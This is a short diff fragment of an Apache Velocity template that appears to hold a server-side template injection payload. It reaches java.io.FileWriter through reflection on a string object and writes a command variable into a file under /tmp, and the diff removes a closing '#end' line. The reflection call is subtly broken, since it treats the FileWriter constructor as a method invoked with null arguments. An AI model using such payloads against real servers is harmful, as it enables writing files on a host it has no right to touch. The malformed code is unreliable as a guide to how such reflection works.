@@ -3,4 +3,3 @@ $monkey
 #set ($e="exp")
 #set ($a=$e.getClass().forName("java.io.FileWriter").getMethod("FileWriter",null).invoke("/tmp/xxxx").write($cmd))
 $monkey
-#end
